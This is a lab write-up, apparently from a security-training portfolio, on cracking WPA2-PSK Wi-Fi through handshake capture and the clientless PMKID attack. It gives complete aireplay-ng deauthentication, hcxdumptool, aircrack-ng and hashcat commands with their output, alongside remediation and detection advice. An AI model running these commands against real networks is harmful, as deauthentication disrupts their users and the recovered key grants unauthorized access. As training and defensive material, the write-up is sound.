> **English** | [Italiano](README.md)

# WPA/WPA2 cracking - handshake capture and PMKID attack

> - **Phase:** Wireless Security - Credential Access (802.11 PSK recovery)
> - **Visibility:** Variable - the passive handshake capture is low-visibility; offline cracking is completely invisible (no packet toward the target); the deauthentication to force the handshake is Active and detectable by a WIDS
> - **Prerequisites:** Complete 4-way handshake or PMKID captured (see `../recon-monitor/`); adequate wordlists (module 04-system-exploitation/05-password-cracking/wordlists); GPU for hashcat (essential acceleration on WPA2)
> - **Output:** WIFI-002, WIFI-003; cleartext PSK recovered; complete access to the target WiFi network as a legitimate client; base for lateral movement toward the internal network

- **Operating Environment:** Kali Linux (Attacker), NVIDIA GPU for hashcat, lab WPA2-PSK network
- **Target:** AP `LAB-CORP` (BSSID `AA:BB:CC:DD:EE:FF`), weak test PSK
- **Main tools:** aircrack-ng, hcxdumptool, hcxtools, hashcat

---

## Executive summary

WPA/WPA2-PSK cracking is the attack that turns radio reconnaissance into effective access to the network. Unlike WEP (cryptographically broken and crackable in minutes regardless of the password), WPA2 is cryptographically solid: the only vector is the offline dictionary attack against the captured authentication material. The security of the network is therefore reduced entirely to the robustness of the Pre-Shared Key.

Two paths exist to obtain the material to crack. The first, classic, captures the 4-way handshake that occurs when a client authenticates to the AP (WIFI-002). The second, modern (2018+), exploits the PMKID present in the first message of the handshake and does not require any connected client: it is the clientless attack (WIFI-003), significantly more efficient because it eliminates the wait for an authentication or the need to deauthenticate a client.

Both paths converge on hashcat, where the robustness of the PSK determines the feasibility: an 8-numeric-digit password falls in minutes, a 20-character alphanumeric passphrase is computationally unreachable with a dictionary attack.

---

## Folder structure

```
cracking/
+-- README.md      # this file: WPA2 handshake (WIFI-002) + clientless PMKID (WIFI-003)
+-- img/           # handshake capture screenshots and hashcat output
```

---

## Attack 1: 4-Way handshake capture & crack

**Finding ID:** `WIFI-002` | **Severity:** `High` (WPA2 PSK recovered - complete access to the network as a legitimate client)

### Operational context

The 4-way handshake is the exchange of four EAPOL messages with which client and AP derive and confirm the session keys starting from the PSK. Capturing this exchange yields all the material necessary for an offline dictionary attack: the traffic is not "decrypted", one verifies offline which password produces the same MIC (Message Integrity Code) observed in the handshake.

### PoC - phase 1: handshake capture

```Bash
# Targeted listening on the target's channel, saving to file
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w handshake_lab wlan0mon

# In a second terminal: deauthentication to force the re-association of a client
sudo aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF -c A0:B1:C2:D3:E4:F5 wlan0mon
```

```
 CH  6 ][ Elapsed: 48 s ][ 2026-05-12 15:10 ][ WPA handshake: AA:BB:CC:DD:EE:FF   <-- handshake captured

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC  CIPHER AUTH ESSID
 AA:BB:CC:DD:EE:FF  -41 100      620       88    2   6  270   WPA2 CCMP   PSK LAB-CORP
```

The indication `WPA handshake: AA:BB:CC:DD:EE:FF` in the header confirms the successful capture of the complete 4-way handshake.

### PoC - phase 2: cracking with aircrack-ng

```Bash
# Direct dictionary attack (CPU)
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake_lab-01.cap
```

```
                               Aircrack-ng 1.7

      [00:03:41] 1857420/14344391 keys tested (8420.15 k/s)

      KEY FOUND! [ Password123! ]                          <-- PSK recovered (WIFI-002)

      Master Key     : CD 69 0D 11 8E AC ... 8F 2A
      Transient Key  : 33 55 0B FC 4F 24 ... A1 9C
      EAPOL HMAC     : 9E C5 8A 21 7B ... 4D
```

### PoC - phase 3: accelerated cracking with hashcat (GPU)

```Bash
# Conversion to the hashcat 22000 format (new unified standard)
hcxpcapngtool -o hash_lab.22000 handshake_lab-01.cap

# GPU attack with wordlist + rules
hashcat -m 22000 hash_lab.22000 /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

```
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Speed.#1.........:   412.5 kH/s (GPU)                      <-- 50x compared to the CPU
Recovered........: 1/1 (100.00%) Digests
```

### Remediation WIFI-002

- **Immediate action:** replace the PSK with a passphrase of at least 15 high-entropy characters (mix of uppercase, lowercase, numbers, symbols), not present in public wordlists; the dictionary attack becomes computationally ineffective
- **Structural action:** migrate to WPA2/WPA3-Enterprise (802.1X with RADIUS) which eliminates the shared PSK and authenticates each user individually; enable WPA3-SAE where supported (Simultaneous Authentication of Equals) which makes the offline dictionary attack impossible even with a captured handshake
- **Verification:** periodic audit of the PSK against known wordlists; WIDS monitoring for deauth flood patterns that precede the handshake capture

---

## Attack 2: PMKID clientless attack

**Finding ID:** `WIFI-003` | **Severity:** `High` (PSK recovered without connected clients - more efficient clientless attack)

### Operational context

The PMKID attack (discovered by Jens Steube of hashcat in 2018) exploits an optional field present in the first EAPOL message of the handshake, sent by the AP itself. Since the PMKID is derived from the PMK (which depends on the PSK) but is transmitted by the AP without the need for an authenticated client, a single association request is sufficient to obtain it. This eliminates the need to wait for or force the authentication of a legitimate client - the weak point of the classic method.

### PoC - PMKID capture and extraction

```Bash
# Targeted clientless capture with hcxdumptool
sudo hcxdumptool -i wlan0mon -o pmkid_lab.pcapng --enable_status=1 --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2
```

```
[15:40:12] AA:BB:CC:DD:EE:FF  LAB-CORP  [FOUND PMKID CLIENT-LESS]   <-- PMKID captured without client
```

```Bash
# Extraction and conversion to the hashcat 22000 format
hcxpcapngtool -o pmkid_lab.22000 pmkid_lab.pcapng

# GPU cracking (same -m 22000 mode, hashcat distinguishes PMKID and EAPOL)
hashcat -m 22000 pmkid_lab.22000 /usr/share/wordlists/rockyou.txt
```

```
AA...FF*LAB-CORP:Password123!                              <-- PSK recovered via PMKID (WIFI-003)
Status...........: Cracked
```

### Remediation WIFI-003

- **Immediate action:** the mitigation is identical to WIFI-002 (robust PSK), because the PMKID is vulnerable only if the PSK is weak. In addition, some APs allow disabling the PMKID transmission (option "PMKID caching" / 802.11r roaming): disable it if fast roaming is not necessary
- **Structural action:** WPA3-SAE completely eliminates the PMKID vector; on enterprise networks, 802.1X does not use a PSK and is therefore not attackable via PMKID
- **Verification:** verify with `hcxdumptool` in a controlled environment whether your AP exposes the PMKID; test the PSK against extended wordlists

---

## Lab experience

The first practical obstacle was the capture of the complete handshake. In the lab, the only client (`A0:B1:C2:D3:E4:F5`) was already associated and stable: airodump-ng could remain listening for hours without capturing anything, because the handshake occurs only at the moment of association. The targeted deauthentication solved the problem by forcing the re-association, but it highlighted an operational lesson: the deauth generates detectable traffic, and in a context with an active WIDS this step is the moment of maximum exposure.

The switch to hcxdumptool for the PMKID attack completely changed the economics of the attack. Without having to wait for or disturb any client, the PMKID was obtained in less than ten seconds from a single forged Association Request. This explains why the PMKID has become the preferred method in modern wireless penetration tests: it is faster, quieter (no deauth toward legitimate clients) and equally effective.

The decisive factor in both cases was not the tool but the wordlist. The test PSK (`Password123!`) is present in rockyou.txt and fell in a few minutes. Repeating the exercise with a randomly generated 18-character passphrase, neither of the two attacks produced results in reasonable time - the practical confirmation that WPA2 is secure exactly as much as its password is.

---

## Theoretical analysis: PBKDF2 and the cost of cracking

WPA2-PSK derives the Pairwise Master Key (PMK) from the passphrase via PBKDF2-HMAC-SHA1 with 4096 iterations and the SSID as salt: `PMK = PBKDF2(passphrase, SSID, 4096, 256)`. The 4096 iterations are a deliberate design choice (key stretching): they deliberately make the computation of every single candidate costly, slowing down the dictionary attack.

This has two practical consequences. First, the use of the SSID as salt means that rainbow tables are possible only for common SSIDs ("linksys", "NETGEAR"): for unique SSIDs the attack must compute the PMK from scratch for each password. Second, WPA2 cracking is intrinsically slow compared to other hashes - the few hundred kH/s on GPU (versus the billions of H/s for an MD5) derive precisely from the 4096 PBKDF2 iterations.

WPA3-SAE (Dragonfly handshake) solves the problem at the root: it replaces the PSK exchange with a key agreement protocol based on elliptic curves that provides forward secrecy and - fundamentally - resistance to offline attacks. Even capturing the entire SAE exchange, an attacker does not obtain material attackable by dictionary, because the protocol requires an online interaction for each attempt (making brute-force detectable and rate-limitable on the AP side).

---

## Real-World scenario: Post-Exploitation projection

> This section describes how this finding would fit into a real engagement, from both the attacker (Red Team) and defender (Blue Team) perspectives.

### Attacker perspective (red team)

**Starting point:** WPA2 PSK recovered, access to the target WiFi network as a legitimate client (WIFI-002/WIFI-003).

**Immediate next step:** connection to the network and internal reconnaissance - the attacker is now on the internal network segment, often beyond the firewall perimeter.

**Projected kill chain:**

```
[WIFI-002/003] WiFi access as a legitimate client
        |
        v
Internal network scan (nmap) -> hosts, services, exposed SMB shares
        |
        v
Lateral movement -> credential harvesting (Responder, NetExec)
        |
        v
Escalation on Active Directory -> Domain Admin
        |
        v
Data exfiltration / persistence / ransomware deployment
```

**Potential impact:** WiFi access bypasses the physical perimeter and the border firewall. In many organizations the corporate WiFi network has direct visibility onto the internal servers: a weak shared PSK known to dozens of employees (and former employees) becomes the cheapest entry point toward the entire infrastructure. The direct link is with `07-post-exploitation/` (lateral movement) and `02-vulnerability-assessment/` (internal scanning).

### Defender perspective (blue team)

**Detection:** a WIDS/WIPS detects the deauth floods that precede the handshake capture (Event: deauthentication storm). Offline cracking is instead invisible: it generates no traffic. The first detectable signal on the defense side is the anomalous association of a new MAC device to the network.

**Indicators of Compromise (IOC):**
- Burst of deauthentication frames (deauth code 7) toward legitimate clients
- Repeated Association Requests from unknown MACs (hcxdumptool pattern)
- New device on the WiFi network with a MAC not present in the asset inventory
- Internal scanning traffic (nmap) originating from an IP of the WiFi pool

**Containment:** immediate rotation of the PSK; isolation of the WiFi segment from the server network (dedicated VLAN + firewall); MAC filtering as a temporary measure (not resolutive, the MAC is spoofable).

**Eradication and hardening:**
- Migration to WPA2/WPA3-Enterprise (802.1X): every user has individual credentials, revocable individually
- Segmentation: the WiFi VLAN must not have direct access to the servers; route everything through a firewall with explicit policies
- Mandatory PMF (802.11w) to prevent forged deauths
- Deploy of a WIPS that actively responds to rogue APs and deauth floods

**Defensive lesson:** a shared PSK is a static secret known to too many people. The Enterprise model (802.1X) shifts authentication from "what the network knows" (a shared password) to "who you are" (individual credentials), making revocation and audit possible.

---

## Reference tools

| tool | type | technique/access | main use case |
| :--- | :--- | :--- | :--- |
| `airodump-ng` | wireless sniffer | cli | capture of the 4-way handshake on the targeted channel |
| `aireplay-ng` | frame injector | cli | deauthentication to force re-association and the handshake |
| `aircrack-ng` | wpa cracker (cpu) | cli | direct dictionary cracking on .cap (cpu-bound) |
| `hcxdumptool` | clientless capture | cli | pmkid capture without connected clients (modern attack) |
| `hcxtools` | format converter | cli | conversion of .pcapng to the hashcat 22000 format |
| `hashcat` | gpu cracker | cli | gpu-accelerated cracking with rules (mode 22000) |
| `Wifite2` | attack automator | cli | automation of the entire capture+crack flow (see `../automated-attacks/`) |

> **Recommended modern tool:** the `22000` format of hashcat (WPA-PBKDF2-PMKID+EAPOL) unified since 2019 the old formats 2500 (handshake) and 16800 (PMKID). Always use `hcxpcapngtool` for conversion and `hashcat -m 22000`: the mode automatically handles both PMKID and handshake in the same hash file.

---

## MITRE ATT&CK mapping

| tactic | technique | mitre id | action description |
| :--- | :--- | :--- | :--- |
| credential access | network sniffing | `T1040` | passive capture of the 4-way eapol handshake and the pmkid from the 802.11 frames (WIFI-002, WIFI-003) |
| collection | adversary-in-the-middle | `T1557` | deauthentication of a client to force re-association and capture the handshake (WIFI-002) |
| credential access | brute force: password cracking | `T1110.002` | offline dictionary attack on handshake/pmkid with aircrack-ng and hashcat (WIFI-002, WIFI-003) |
| initial access | valid accounts | `T1078` | use of the recovered psk to access the wifi network as a legitimate client |

---

> **Note:** All documented activities were conducted on a lab WiFi network owned by the author, with known test PSKs. The capture of handshakes, the sending of deauthentication frames and the cracking were performed exclusively against test APs. Unauthorized access to third-party WiFi networks is a crime. Techniques are documented for educational and authorized security assessment purposes.
